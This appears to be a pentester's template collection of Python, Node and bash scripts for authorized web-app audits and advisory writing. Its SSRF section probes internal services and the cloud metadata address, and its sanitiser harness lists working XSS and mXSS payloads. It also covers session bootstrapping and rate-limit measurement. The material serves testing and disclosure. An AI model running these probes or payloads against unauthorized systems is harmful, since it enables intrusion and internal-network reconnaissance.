# PoC Templates

Reusable Python + Node snippets for authorized-pentest engagements. All examples are intentionally vanilla — no custom dependencies beyond `requests`, `urllib3`, and optionally `jsdom` + `dompurify` for sanitiser harnesses.

Adapt the `BASE`, cookie name (`session`, `__Secure-session_token`, etc.), and endpoint paths for each target. Every script is opinionated about rate-limiting itself; keep the `time.sleep(...)` calls in place.

## 1. Authenticated probe bootstrap

Signs up a throwaway account, captures the session cookie (handling the `__Secure-` prefix correctly), and pickles it for reuse across scripts.

```python
#!/usr/bin/env python3
"""Bootstrap a researcher session on the target. Pickles creds to /tmp."""
import requests, pickle, uuid, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://TARGET.example"
SIGNUP_PATH = "/api/auth/sign-up/email"   # adapt to target's auth framework
SIGNIN_PATH = "/api/auth/sign-in/email"

H = {
    "User-Agent": "security-research/1.0 (authorized audit — {SCOPE REFERENCE})",
    "Origin": BASE,   # many Better-Auth endpoints reject missing Origin
    "Referer": BASE + "/",
}

uid = uuid.uuid4().hex[:8]
email = f"security-research-{uid}@pentest.test"
username = f"secr-{uid}"
password = "SecResearch-1337!"

s = requests.Session(); s.headers.update(H); s.verify = False

r = s.post(BASE + SIGNUP_PATH,
           json={"email": email, "password": password, "name": "Researcher", "username": username},
           headers={"Content-Type": "application/json"},
           timeout=15)
assert r.status_code == 200, f"signup failed: {r.status_code}  {r.text[:300]}"

# Better-Auth sometimes returns a session cookie on signup; if not, sign in
if not any("session" in c.name.lower() for c in s.cookies):
    r = s.post(BASE + SIGNIN_PATH,
               json={"email": email, "password": password},
               headers={"Content-Type": "application/json"},
               timeout=10)
    assert r.status_code == 200, f"signin failed: {r.status_code}  {r.text[:300]}"

pickle.dump({
    "email": email, "username": username, "password": password, "uid": uid,
    "cookies": requests.utils.dict_from_cookiejar(s.cookies),
}, open(f"/tmp/creds-{uid}.pkl", "wb"))
print(f"[+] session cookies: {[c.name for c in s.cookies]}")
print(f"[+] creds pickled → /tmp/creds-{uid}.pkl")
```

### Cookie-restore loader

Every follow-on probe starts with:

```python
import requests, pickle, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

creds = pickle.load(open("/tmp/creds-XXXXXXXX.pkl", "rb"))
s = requests.Session()
s.headers.update({
    "User-Agent": "security-research/1.0 (authorized audit)",
    "Origin": "https://TARGET.example",
})
s.verify = False
for k, v in creds["cookies"].items():
    s.cookies.set(k, v, domain="TARGET.example", secure=True)

# Optional: re-sign-in if the session expired
r = s.post("https://TARGET.example/api/auth/sign-in/email",
           json={"email": creds["email"], "password": creds["password"]},
           headers={"Content-Type": "application/json"}, timeout=10)
```

## 2. Snapshot probe (living-target detection)

Run at the start of every verification round. Diff the JSON output against the prior round to catch silent maintainer patches.

```python
#!/usr/bin/env python3
"""Before each verification round, capture the current defensive posture."""
import requests, json, time, urllib3
from collections import Counter
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://TARGET.example"
H = {"User-Agent": "security-research/1.0 (authorized audit)"}

def probe_headers(path="/"):
    r = requests.get(BASE + path, headers=H, timeout=10, verify=False, allow_redirects=False)
    return {k: v[:100] for k, v in r.headers.items()
            if k.lower() in {
                "content-security-policy", "content-security-policy-report-only",
                "strict-transport-security", "x-frame-options",
                "x-content-type-options", "referrer-policy", "permissions-policy",
                "cross-origin-opener-policy", "cross-origin-embedder-policy",
                "cross-origin-resource-policy",
            }}

def count_status(endpoint, n=10, sleep=0.3):
    codes = []
    for _ in range(n):
        r = requests.post(BASE + endpoint,
                          json={"email": "nobody@pentest.test", "password": "wrong"},
                          headers={"Content-Type": "application/json"},
                          timeout=8, verify=False)
        codes.append(r.status_code)
        time.sleep(sleep)
    return dict(Counter(codes))

def resolve_origin(hostname):
    # customize for your target — this is just an example
    import socket
    try: return socket.gethostbyname(hostname)
    except: return None

def probe_health(path="/api/health"):
    r = requests.get(BASE + path, headers=H, timeout=10, verify=False)
    try: return r.json()
    except: return r.text[:200]

snapshot = {
    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "headers_root": probe_headers("/"),
    "sign_in_status_codes": count_status("/api/auth/sign-in/email", n=10),
    "resolved_ip": resolve_origin("TARGET.example"),
    "health_echo": probe_health(),
}
fname = f"/tmp/snapshot-{int(time.time())}.json"
open(fname, "w").write(json.dumps(snapshot, indent=2, default=str))
print(f"[+] snapshot → {fname}")
# Compare: diff /tmp/snapshot-<T1>.json /tmp/snapshot-<T2>.json
```

## 3. Rate-limit posture measurement

```python
#!/usr/bin/env python3
"""Categorize a rate-limit as none / partial / strong. Always sleep ≥60s
between runs against the same endpoint so earlier probes don't pollute."""
import requests, time, urllib3
from collections import Counter
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://TARGET.example"
H = {"User-Agent": "security-research/1.0 (authorized audit)"}

def measure(endpoint, body_fn, n=20, label=""):
    codes = []
    t0 = time.time()
    for i in range(n):
        r = requests.post(BASE + endpoint, json=body_fn(i),
                          headers={**H, "Content-Type": "application/json"},
                          timeout=8, verify=False)
        codes.append(r.status_code)
    dt = time.time() - t0
    cnt = Counter(codes)
    first_429 = next((i for i, c in enumerate(codes) if c == 429), None)

    if cnt.get(429, 0) == 0:
        state = "NOT_MITIGATED"
    elif first_429 is not None and first_429 <= 3:
        state = "STRONG"
    elif first_429 is not None and first_429 <= 9:
        state = "PARTIAL"
    else:
        state = "WEAK"

    print(f"[{label or endpoint}] {n} attempts / {dt:.1f}s → {dict(cnt)}; "
          f"first 429 at #{first_429}; state={state}")
    return state, cnt, first_429

measure("/api/auth/sign-in/email",
        lambda i: {"email": "nobody@pentest.test", "password": f"wrong{i}"},
        n=20, label="sign-in/email")

# Wait for bucket drain before another endpoint
time.sleep(75)

measure("/api/auth/request-password-reset",
        lambda i: {"email": "victim@pentest.test"},
        n=10, label="request-password-reset")
```

## 4. SSRF error-shape oracle

Probe an outbound-URL-accepting endpoint with a matrix of targets. The distinct error-string classes expose internal-network topology.

```python
#!/usr/bin/env python3
"""Map internal topology via SSRF error shapes. Requires an authenticated
endpoint that accepts a user-supplied URL (AI baseURL, webhook, image url)."""
import requests, pickle, urllib3, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://TARGET.example"
H = {"User-Agent": "security-research/1.0 (authorized audit)", "Origin": BASE}
# Load session from bootstrap script
creds = pickle.load(open("/tmp/creds-XXXXXXXX.pkl", "rb"))
s = requests.Session(); s.headers.update(H); s.verify = False
# (cookie restore + re-signin as in section 1)

TARGETS = [
    ("external OK",             "https://example.com"),
    ("external 404",            "https://example.com/nonexistent"),
    ("localhost / app",         "http://localhost:3000"),
    ("localhost / common db",   "http://localhost:5432"),
    ("localhost / common cache","http://localhost:6379"),
    ("swarm svc / postgres",    "http://postgres:5432"),
    ("swarm svc / redis",       "http://redis:6379"),
    ("swarm svc / worker",      "http://worker:3000"),
    ("closed port",             "http://localhost:65500"),
    ("nonexistent host",        "http://nonexistent-{uuid}.test:80"),
    ("cloud metadata",          "http://169.254.169.254/metadata/v1/"),
    ("RFC1918 private",         "http://10.0.0.1"),
]

for label, url in TARGETS:
    try:
        r = s.post(BASE + "/api/AUTH_URL_ACCEPTING_ENDPOINT",
                   json={"baseURL": url, "apiKey": "sk-fake", "provider": "openai"},
                   headers={"Content-Type": "application/json"},
                   timeout=12)
        # extract the inner error string; differ per framework
        try: msg = r.json().get("message") or r.json().get("json", {}).get("message", "")
        except: msg = r.text
        print(f"  {label:30} [{r.status_code}]  msg={msg[:130]}")
    except Exception as e:
        print(f"  {label:30} ERR  {str(e)[:80]}")
    time.sleep(0.5)

# Interpretation (classic):
#   ENOTFOUND         → DNS failed (host not in container's resolver)
#   ECONNREFUSED      → host up, no listener on that port
#   "other side closed" / "Connection reset" → TCP OK, protocol mismatch (DB wire)
#   "Not Found" / 404 → HTTP reachable, no matching route
#   timeout           → filtered / offline (or target is genuinely slow)
# 4+ distinct classes = you have a blind-SSRF port-scan primitive.
```

### Version fingerprint via content-echoing SSRF

If the target accepts a URL whose response body gets returned (for example, a media-URL field that the server fetches and base64-encodes as a data URL in the JSON response), point it at the server's own `/health` / `/status` / `/metrics` endpoint.

```python
# Step 1 — update the object to set the attacker-controlled URL to an internal
# version-echo endpoint. Adapt the patch path / endpoint / method to the target.
patch_body = {"json": {"id": RESOURCE_ID, "operations": [
    {"op": "replace", "path": "/media/href",
     "value": "http://localhost:3000/api/health"}
]}}
s.post(BASE + "/api/rpc/resource/patch", json=patch_body,
       headers={"Content-Type": "application/json"}, timeout=10)

# Step 2 — call the endpoint that echoes the fetched body back. If this is
# unauthenticated (because of a separate access-control bug), great; otherwise
# reuse the authed session from step 1.
r = requests.post(BASE + "/api/rpc/resource/getAndFetch",
                  json={"json": {"id": RESOURCE_ID}},
                  headers={"Content-Type": "application/json"},
                  timeout=20, verify=False)
url = r.json().get("json", {}).get("data", {}).get("media", {}).get("href", "")
if url.startswith("data:"):
    import base64
    _, _, b64 = url.partition(",")
    print(base64.b64decode(b64[:6000]).decode("utf-8", "replace"))
# Look for Node/Chrome/V8/DB/library versions in the echoed JSON.
# Cross-reference vs the upstream project's latest stable release.
```

## 5. Sanitiser-bypass harness (DOMPurify or similar)

**The wrong test:** regex-search the output for `<script>` / `javascript:`. Misses mutation bypasses.

**The right test:** parse the sanitised output with JSDOM and ask: did any `<script>` element survive, any attribute starting with `on`, any `javascript:` URL in href/src?

```js
// test-mxss.mjs — run inside the target repo so resolver picks up deps
// From a clean /tmp: mkdir tmp-probe && cd tmp-probe && npm init -y && npm i dompurify jsdom
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const purify = DOMPurify(new JSDOM('').window);

// Load the *exact* config used by the target (copy verbatim from the repo)
const CFG = {
  ALLOWED_TAGS: ["p","br","span","div","strong","em","u","s","a","ul","ol","li","blockquote","code","pre"],
  ALLOWED_ATTR: ["class","style","href","target","rel"],
  ALLOWED_URI_REGEXP: /^(?:(?:https?):\/\/|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  RETURN_TRUSTED_TYPE: false,
};

// Published and variant mXSS payloads
const payloads = [
  `<img src=x onerror=alert(1)>`,
  `<script>alert(1)</script>`,
  `<svg onload=alert(1)>`,
  `<iframe src="javascript:alert(1)">`,
  `<a href="javascript:alert(1)">click</a>`,
  `<a href="data:text/html,<script>alert(1)</script>">click</a>`,
  `<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>`,
  `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">`,
  `<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
  `<a href="java\tscript:alert(1)">click</a>`,
  `<a href="java\nscript:alert(1)">click</a>`,
  `<p oNcLiCk="alert(1)">x</p>`,
  `<template><img src=x onerror=alert(1)></template>`,
  `<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>`,
];

let leaks = 0;
for (const p of payloads) {
  const out = purify.sanitize(p, CFG);
  const doc = new JSDOM(`<body>${out}</body>`).window.document;
  const scripts = doc.querySelectorAll('script').length;
  let handlers = 0, jsUrls = 0;
  for (const el of doc.body.getElementsByTagName('*')) {
    for (const attr of el.attributes) {
      if (attr.name.startsWith('on')) handlers++;
    }
    for (const a of ['href','src']) {
      const v = el.getAttribute(a);
      if (v && /^\s*javascript\s*:/i.test(v)) jsUrls++;
    }
  }
  if (scripts || handlers || jsUrls) {
    leaks++;
    console.log(`BYPASS: [${scripts}s/${handlers}h/${jsUrls}j] ${p.slice(0,80)}`);
    console.log(`        → ${out.slice(0,160)}`);
  }
}
console.log(`\nDOMPurify ${DOMPurify.version}: ${payloads.length - leaks}/${payloads.length} clean`);
```

## 6. Security-headers audit

Dump full headers — **don't** pattern-match. Subtle cases: `Content-Security-Policy-Report-Only` ≠ `Content-Security-Policy`, `/uploads/*` often has different headers than `/`.

```python
#!/usr/bin/env python3
import requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
H = {"User-Agent": "security-research/1.0 (authorized audit)"}

HEADERS = [
    "content-security-policy", "content-security-policy-report-only",
    "strict-transport-security", "x-frame-options", "x-content-type-options",
    "referrer-policy", "permissions-policy",
    "cross-origin-opener-policy", "cross-origin-embedder-policy",
    "cross-origin-resource-policy",
]

SURFACES = [
    ("homepage",      "https://TARGET.example/"),
    ("login",         "https://TARGET.example/auth/login"),
    ("dashboard",     "https://TARGET.example/dashboard"),
    ("rpc endpoint",  "https://TARGET.example/api/rpc/"),
    ("upload route",  "https://TARGET.example/uploads/x/y.webp"),
    ("http redirect", "http://TARGET.example/"),
]

for label, url in SURFACES:
    r = requests.get(url, headers=H, timeout=10, verify=False, allow_redirects=False)
    print(f"=== {label} [{r.status_code}] ===")
    for h in HEADERS:
        v = r.headers.get(h)
        mark = "✗ MISSING" if v is None else f"✓ {v[:90]}"
        print(f"  {h:35} {mark}")
    print()

# After dumping: classify each header as enforced / report-only / missing
# DO NOT conclude "all missing" from a single probe — reconfirm with curl -sI
# in a separate shell before writing it up.
```

## 7. Advisory edit loop

```bash
#!/usr/bin/env bash
set -euo pipefail

ADV="GHSA-xxxx-xxxx-xxxx"
REPO="OWNER/REPO"

# 1. Check current state
gh api /repos/$REPO/security-advisories/$ADV \
  --jq '{state, updated_at, desc_len: (.description | length), cwe_ids}'

# 2. Pull in-place (don't accumulate v1/v2/v3 files)
gh api /repos/$REPO/security-advisories/$ADV --jq '.description' > /tmp/advisory.md

# 3. Edit /tmp/advisory.md with your editor of choice
${EDITOR:-vi} /tmp/advisory.md

# 4. Build PATCH payload (Python avoids quote-escaping issues)
python3 - <<'PY'
import json
desc = open('/tmp/advisory.md').read()
open('/tmp/patch.json','w').write(json.dumps({
  'description': desc,
  'cwe_ids': ['CWE-200','CWE-284','CWE-307','CWE-918'],  # edit to match
}))
print(f'payload bytes: {len(json.dumps({"description": desc}))}')
PY

# 5. PATCH
gh api -X PATCH /repos/$REPO/security-advisories/$ADV \
  --input /tmp/patch.json \
  --jq '{updated_at, desc_len: (.description | length), state}'
```

## 8. Patch-set export for advisory inlining

```bash
#!/usr/bin/env bash
# After committing to a local branch off origin/main:
set -euo pipefail
BASE_SHA=$(git rev-parse origin/main)
OUT=./patches
mkdir -p $OUT

# ALWAYS use a SHA range, never `-N` (picks wrong commits when base is far back)
git format-patch $BASE_SHA..HEAD -o $OUT
ls -la $OUT

# Build the advisory snippet
{
  echo "### Proposed patches (on \`main\` @ $BASE_SHA)"
  echo
  echo "Apply with:"
  echo '```bash'
  for p in $OUT/*.patch; do
    echo "git am < $(basename $p)"
  done
  echo '```'
  echo
  for p in $OUT/*.patch; do
    echo "<details><summary>$(basename $p)</summary>"
    echo
    echo '```patch'
    cat "$p"
    echo '```'
    echo
    echo "</details>"
    echo
  done
} > /tmp/patch_section.md

echo "patch_section bytes: $(wc -c < /tmp/patch_section.md)"
# Append this to /tmp/advisory.md before PATCH-ing.
```

## 9. Cleanup rituals

```bash
# After the engagement, before closing the session:
cd <target-repo>
git status                          # expect clean
git log --oneline origin/main..HEAD  # expect your commits only

# Local probe artefacts to preserve with PII redacted:
ls /tmp/*pentest* /tmp/*creds* /tmp/*snapshot* /tmp/advisory*.md

# Local probe artefacts safe to delete:
rm /tmp/patch_*.json /tmp/scalar.html /tmp/probe_*.py
```

## Opinionated defaults (copy-paste for every probe script)

```python
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

H = {"User-Agent": "security-research/1.0 (authorized audit — {SCOPE_REF})"}
# Every requests.* call:
requests.get(URL, headers=H, timeout=10, verify=False)
# or sessions with s.verify = False

import time
RATE = 0.35  # seconds between requests → ~3/sec
```

If you find yourself writing `threads=` or `asyncio.gather` anywhere in a probe, stop. Research-grade probes are single-threaded by default; concurrency is for the maintainer's penetration team, not yours.
